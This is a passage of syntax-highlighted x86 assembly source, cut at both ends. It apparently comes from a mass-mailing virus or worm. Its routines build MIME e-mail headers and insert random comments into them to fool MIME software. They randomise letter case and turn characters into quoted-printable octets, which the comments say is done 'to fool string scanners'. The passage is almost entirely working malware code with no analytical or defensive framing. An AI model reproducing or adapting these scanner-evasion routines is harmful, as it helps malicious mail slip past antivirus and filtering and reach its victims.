        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decomploop</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">decomppop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">decomppop</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">decompload</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">decompldret</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">decompldret</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">decompload</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">decompress</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;fill random number of lines with random number of random characters</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">randlines</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">randloop</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc0">                         </span><span class="sc1">;highest power of 2, -1, &lt;= 76</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randline</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">randloop</span><span class="sc0">

</span><span class="sc5">randword</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">randline</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">randline</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">randline</span><span class="sc0">

</span><span class="sc5">store_crlf</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">store_crlf</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">randline</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">randword</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">randlines</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">decompmime</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc5">patch_mime</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"RTF!"</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcmap</span><span class="sc0">                      </span><span class="sc1">;header31 ("MIME-Version:")</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomnt</span><span class="sc0">                     </span><span class="sc1">;header32 ("1.0")</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_crlf</span><span class="sc0">
</span><span class="sc5">decompmime</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;insert random comments into MIME headers, to fool non-compliant MIME software</span><span class="sc0">
</span><span class="sc1">;this includes some Microsoft products, such as Internet Mail And News :(</span><span class="sc0">
</span><span class="sc1">;map case randomly</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">decompcomcr</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_crlf</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc0">

</span><span class="sc5">decompcomnt</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71</span><span class="sc0">                         </span><span class="sc1">;highest multiple of 4, &lt; 76, -1</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">decompname</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;copy up to 3 original characters, always at least 1</span><span class="sc0">
</span><span class="sc1">;if no room for more comments, then copy remainder and quit</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">comnt_copy</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">force_copy</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">force_copy</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">comnt_ret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">comnt_ret</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randcase</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;insert up to 3 random comment characters, always at least 1</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">force_store</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">force_store</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'('</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;printable character from 20 ( ) to 7e (~), except '(', ')', and '\'</span><span class="sc0">
</span><span class="sc1">;cannot use '(' or ')' because comments can be nested, '\' has special meaning</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">comnt_add</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">comnt_add</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'('</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">comnt_bound</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">')'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">comnt_add</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\' + 1
</span><span class="sc0">        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">comnt_add</span><span class="sc0">

</span><span class="sc5">comnt_bound</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">comnt_add</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">')'</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">comnt_copy</span><span class="sc0">

</span><span class="sc5">comnt_ret</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">comnt_skip</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randcase</span><span class="sc0">

</span><span class="sc5">comnt_skip</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">randcase</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">case_skip</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">case_skip</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">randcase</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">randcase</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">decompname</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">decompcomnt</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">decompcomcr</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;map case randomly without comments</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">decompcmap</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randcase</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part24</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part23</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">decompcmap</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;randomly convert characters to octets to fool string scanners</span><span class="sc0">
</span><span class="sc1">;automatically wraps long lines</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">decompoct</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">octet_line</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">octet_copy</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">72</span><span class="sc0">                              </span><span class="sc1">;highest safe multiple of 3, &lt; 76</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;don't process '=' if used as line-continue character</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">octet_check</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d3dh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">octet_eqcrlf</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">octet_crlf</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">octet_break</span><span class="sc0">                     </span><span class="sc1">;signed compare in case of &lt; 0</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;randomly process any character</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">octet_make</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;always process '=' character</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'='</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">octet_skip</span><span class="sc0">

</span><span class="sc5">octet_make</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'='</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">aam</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
